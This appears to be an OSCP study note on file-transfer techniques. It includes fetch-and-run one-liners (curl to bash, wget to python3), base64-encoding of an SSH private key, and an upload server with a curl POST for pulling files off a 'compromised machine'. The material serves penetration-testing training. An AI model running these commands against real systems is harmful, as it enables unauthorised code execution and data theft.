---
permalink: oscp/techniques/file-transfer/untitled
title: Untitled
type: note
---
## Download Operations

#### Checking File Hash
```bash
md5sum id_rsa
```


#### Encoding SSH Keys
```bash
cat id_rsa |base64 -w 0;echo
```

#### Decoding a file
```bash
echo -n '<INSERT BASE64 PAYLOAD>' | base64 -d > id_rsa
```

---
## Web Download with wget and curl

#### Download File with wget
```bash
wget <URL TO FILE> -O <WHERE TO SAVE FILE>
```

#### Download File using cURL
```bash
curl -o <WHERE TO SAVE FILE> <LINK TO FILE>
```

---

## Fileless Attacks Using Linux

#### Executing a File without Downloading
```bash
curl <LINK TO FILE> | bash
```

```bash
wget -qO- <URL TO FILE> | python3
```

---
## Download File with Bash (/dev/tcp)

#### 1) Connect to Target Webserver
```bash
exec 3<>/dev/tcp<IP>/<PORT (usually 80 or 443)>
```

#### 2) HTTP GET Request
```bash
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
```

#### 3) Print Response
```bash
cat <&3
```

---
## SSH Downloads

#### 1) Enable SSH
```bash
sudo systemctl enable ssh
```

#### 2) Start SSH Server
```bash
sudo systemctl start ssh
```

#### 3) Check for Listening Ports
```bash
netstat -lnpt
```

#### 4) Download file using `scp`
```bash
scp <USER>@<IP>:<PATH TO FILE> <WHERE TO SAVE FILE LOCALLY>
```

## Web Upload

#### 1) Starting Web server
```bash
sudo python3 -m pip install --user uploadserver
```

#### 2) Create Self-Signed Certificate
```bash
openssl req -x509 -out <FILENAME>.pem -keyout <FILENAME>.pem -newkey rsa:2048 -nodes sha256 -subj '/CN=<NAME IDENTIFYING THE SERVER>'
```
- `-out` is for certificate filename
- `-keyout` is for private key filename
- `CN` is for Name identifying server

#### 3) Start webserver
```bash
sudo python3 -m uploadserver 443 --server-certificate <PATH TO CERTIFICATE>
```

#### 4) Upload Files from compromised machine
```bash
curl -X POST https://<IP>/upload -F 'files=@<PATH TO FILE>' -F 'files=@<PATH TO ANOTHER FILE>' --insecure
```

---
## Alternate Web File Transfer Method

#### Creating a Web Server with python3
```bash
python3 -m http.server
```

#### Creating a Web Server with Python2.7
```bash
python 2.7 -m SimpleHTTPServer
```

#### Creating a Web Server with PHP
```bash
php -S 0.0.0.0:8080
```

#### Creating Web Server with Ruby
```bash
ruby -run -ehttpd . -p8000
```

#### Download File from Target Machine onto Attacker Machine
```bash
wget <IP>:<PORT>/<FILE TO TRANSFER>
```

---
## Uploading File with SCP
```bash
scp <PATH TO FILE> 
```


